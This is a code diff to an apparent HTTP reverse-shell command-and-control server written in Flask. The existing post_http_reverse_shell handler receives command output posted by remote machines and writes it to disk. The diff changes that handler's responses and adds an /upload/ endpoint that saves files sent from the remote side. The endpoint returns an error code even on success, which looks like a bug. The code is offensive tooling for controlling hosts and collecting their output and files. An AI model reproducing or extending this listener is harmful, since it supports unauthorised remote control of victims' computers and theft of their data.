@@ -4,11 +4,16 @@
 import os
 import sys
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from config import HOSTNAME, REFRESH_DELAY
 from flask import Flask, request
+from werkzeug.utils import secure_filename
+from config import HOSTNAME, REFRESH_DELAY, ALLOWED_EXTENSIONS
 
 
 app = Flask(__name__)
+
+
+def allowed_file(filename):
+    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
 
 
 @app.route('/', methods=['GET'])
@@ -47,9 +52,20 @@ def post_http_reverse_shell():
     if request.form.get('stdout'):
         with open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'stdout.lock'), 'w') as lock:
             lock.write(request.form.get('stdout'))
-        print(request.form.get('stdout'))
-        return 'Success', 200
-    return 'test', 200
+        return '', 200
+    return 'No data', 400
+
+
+@app.route('/upload/', methods=['POST'])
+def post_upload():
+    file = request.files.get('file')
+    if not file or file.filename == '':
+        return 'No file', 400
+    if allowed_file(file.filename):
+        filename = secure_filename(file.filename)
+        file.save(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'tmp', filename))
+        return '', 400
+    return 'Invalid filename', 400
 
 
 if __name__ == '__main__':
